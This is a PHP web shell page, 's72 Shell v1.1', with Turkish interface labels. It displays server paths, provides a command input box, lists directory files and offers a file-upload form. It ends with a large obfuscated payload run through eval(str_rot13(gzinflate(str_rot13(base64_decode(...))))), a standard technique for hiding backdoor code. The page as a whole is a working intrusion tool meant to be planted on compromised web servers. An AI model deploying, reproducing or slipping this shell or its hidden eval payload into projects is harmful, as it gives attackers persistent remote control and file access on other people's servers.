<html>

<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>
<meta name="Microsoft Theme" content="refined 011">
</head>

<body background="refbgd2.gif" bgcolor="#000000" text="#FFFFFF" link="#666699" vlink="#999999" alink="#999900">

<!--mstheme--><font face="Times New Roman">

<p><font face="Comic Sans MS" color="#FF0000"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>s72 Shell v1.1 Coding by <a href="mailto:crazy_king@turkusev.net">
<font color="#00FF00">Cr@zy_King&nbsp; </font>
</a> </font></p>

      <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <font color="#FF0000"><b><font face="Comic Sans MS" size="1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ 
      Server Bilgileri ]</td>
    </tr>
    <tr>
      <td width="49%" height="142">
      </font></b></font>
</p>
      <p align="center">
        <font color="#800080"><b><font face="Verdana" style="font-size: 8pt">
        Dizin</font></b></font><font face="Verdana" style="font-size: 8pt"><font color="#800080"><b>:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
        <br />
        <b>Shell Dizini:</b> <? echo $SCRIPT_FILENAME ?>
        <br>
        &nbsp;</font></font><p align="center"><form method="post">
<p align="center">
<font color="#800080">
<br>
</font><font face="Verdana" style="font-size: 8pt" color="#800080">Buraya 
Kodunuzu Yaz�n :)</font><font color="#111111"><br>
<br>
</font>
<font color="#FF0000">
<textarea size="70" name="command" rows="2" cols="43" ></textarea> <br>
<br><input type="submit" value="�al��t�r!"></font><font color="#FF0000"><br>
&nbsp;<br></font></p>
      </form>
      <p align="center">
        <font color="#FF0000">
        <textarea readonly size="1" rows="7" cols="53"><?php echo "[syslog]01\n"; @$output = "true";// ?></textarea></font><p align="center">
        &nbsp;<p align="center">
              <font color="#FF0000">
              <td width="49%" height="24" bgcolor="#FCFEBA">
              </font>
      <p align="center"><font color="#FF0000"><b>
      <font face="Comic Sans MS" size="1">[ Diziler -_- Dizinler ]</td>
      <td width="51%" height="24" bgcolor="#FCFEBA">
      </font></b></font>
      <form method="post">
<p align="center">
<font face="Verdana" style="font-size: 11pt">
<?
echo "[syslog]02\n";
$folder=opendir('./');
while ($file = readdir($folder)) {
if($file != "." && $file != "..")
echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
}
closedir($folder);
?></p>
      </form>
      <p align="center">
      <br>
        <b><font face="Comic Sans MS" size="1" color="#FF0000">[ Upload ]</font></b></font><font face="Comic Sans MS" size="1"><b><font color="#FF0000"></td></font></b></font><form enctype="multipart/form-data" method="post">
<p align="center"><br>
<br>
<font face="Verdana" style="font-size: 8pt" color="#800080">Buradan Dosya Upload Edebilirsiniz.</font><br>
<br>
<input type="file" name="file" size="20"><br>
<br>
<font style="font-size: 5pt">&nbsp;</font><br>
<input type="submit" value="Y�kle!"> <br>
&nbsp;</p>
</form>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>

        <!--mstheme--></font>

        </body>

</html>
